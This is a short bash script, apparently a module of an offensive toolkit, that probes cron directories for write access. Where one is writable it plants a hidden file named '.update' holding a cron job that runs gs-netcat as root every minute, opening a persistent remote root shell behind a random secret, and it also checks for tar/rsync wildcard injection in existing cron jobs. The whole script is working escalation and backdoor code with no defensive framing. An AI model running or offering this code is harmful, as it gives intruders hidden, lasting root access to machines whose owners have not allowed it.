#!/bin/bash
source "$(dirname "$0")/00_common.sh"
METHOD="cron"
info "Checking cron..."
for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /var/spool/cron/crontabs; do
    [ -w "$dir" ] 2>/dev/null && {
        secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20)
        echo "* * * * * root gs-netcat -s $secret -l -i &>/dev/null" > "$dir/.update" 2>/dev/null
        chmod 644 "$dir/.update" 2>/dev/null
        result_json "$METHOD" "success" "$dir (wait 1min)" "$secret"; exit 0
    }
done
# Check wildcard injection
grep -r '\*' /etc/cron* 2>/dev/null|grep -qE 'tar|rsync' && { result_json "$METHOD" "partial" "Wildcard injection possible" ""; exit 0; }
result_json "$METHOD" "fail" "No writable cron"; exit 1
